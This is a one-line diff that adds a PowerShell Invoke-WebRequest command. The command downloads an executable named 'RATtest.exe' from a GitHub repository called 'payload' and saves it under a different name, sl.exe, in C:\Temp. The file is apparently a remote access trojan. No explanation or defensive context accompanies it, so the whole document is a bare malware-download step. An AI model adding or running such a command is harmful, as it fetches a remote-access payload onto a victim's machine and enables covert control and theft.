@@ -1,0 +1,1 @@
+Invoke-WebRequest -Uri "https://github.com/DXXNS/payload/raw/main/RATtest.exe" -OutFile "c:\Temp\sl.exe"
